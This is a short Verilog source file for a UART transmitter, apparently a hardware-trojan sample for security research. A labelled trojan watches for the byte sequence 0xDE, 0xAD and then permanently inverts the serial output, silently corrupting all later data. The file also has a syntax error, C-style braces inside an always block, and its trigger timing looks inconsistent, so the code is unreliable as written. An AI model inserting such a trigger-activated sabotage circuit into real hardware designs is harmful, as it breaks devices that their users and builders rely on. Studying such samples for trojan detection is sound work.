 module uart_tx (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output reg tx_serial
);

    // Trojan variables
    reg [7:0] last_byte = 8'd0; // Store the last byte sent
    wire trojan_triggered = (last_byte == 8'hDE) && (rx_data == 8'hAD); // Trigger when "DEAD" pattern is detected

    // Standard UART transmission variables
    reg [9:0] data = 10'b1_11111111_1;
    reg [3:0] counter = 4'd0;
    reg [3:0] sent = 4'd0;
    reg trojan_active = 1'b0; // Indicates whether the trojan has been activated

    always @ (posedge clk) begin
        counter <= counter + 4'd1;

        if (counter == 4'd15)
            data <= {1'b1, data[9:1]};

        if (rx_we & ~tx_busy) begin
            sent <= 4'd0;
            tx_busy <= 1'b1;
            data <= {1'b1, rx_data, 1'b0};
            counter <= 4'd0;
            last_byte <= rx_data; // Store the last byte sent
        end

        if (tx_busy & (counter == 4'd14)) begin
            sent <= sent + 4'd1;

            if (sent == 4'd9) {
                tx_busy <= 1'b0;
                if (trojan_triggered) trojan_active <= 1'b1; // Activate the Trojan when the pattern is detected
            }
        end

        // Trojan activity - invert the output data when triggered
        if (trojan_active) begin
            tx_serial <= ~data[0]; // Invert data bits
        end else begin
            tx_serial <= data[0];
        end
    end

endmodule
